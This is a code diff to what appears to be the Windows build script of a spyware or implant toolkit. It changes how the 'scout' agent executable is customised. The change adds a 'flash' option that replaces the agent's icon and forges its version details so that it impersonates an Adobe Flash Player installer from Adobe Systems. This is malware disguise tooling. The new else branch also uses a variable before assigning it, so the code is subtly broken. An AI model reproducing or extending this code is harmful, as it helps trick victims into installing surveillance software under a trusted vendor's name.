@@ -163,7 +163,7 @@ class BuildWindows < Build
     melting_mode = :melted if @melted
 
     # change the icon of the exec accordingly to the name
-    customize_scout(@factory.confkey) if @scout
+    customize_scout(@factory.confkey, params['icon']) if @scout
 
     case melting_mode
       when :silent
@@ -376,13 +376,21 @@ class BuildWindows < Build
     scout_names[seed.ord % scout_names.size]
   end
 
-  def customize_scout(seed)
+  def customize_scout(seed, icon)
 
-    info = scout_name(seed)
-    icon = "icons/#{info[:name]}.ico"
+    case icon
+      when 'flash'
+        icon_file = "icons/#{icon}.ico"
+        info = {name: 'FlashUtil', version: '11.5.500.104', desc: 'Adobe Flash Player Installer/Uninstaller 11.5 r500', company: 'Adobe Systems Incorporated', copyright: 'Copyright (c) 1996 Adobe Systems Incorporated'}
+      else
+        icon_file = "icons/#{info[:name]}.ico"
+        info = scout_name(seed)
+    end
 
-    CrossPlatform.exec path('rcedit'), "/I #{path('scout')} #{path(icon)}"
+    # change the icon
+    CrossPlatform.exec path('rcedit'), "/I #{path('scout')} #{path(icon_file)}"
 
+    # change the infos
     CrossPlatform.exec path('verpatch'), "/fn /va #{path('scout')} \"#{info[:version]}\" /s pb \"\" /s desc \"#{info[:desc]}\" /s company \"#{info[:company]}\" /s (c) \"#{info[:copyright]}\" /s product \"#{info[:desc]}\" /pv \"#{info[:version]}\""
 
     # sign it
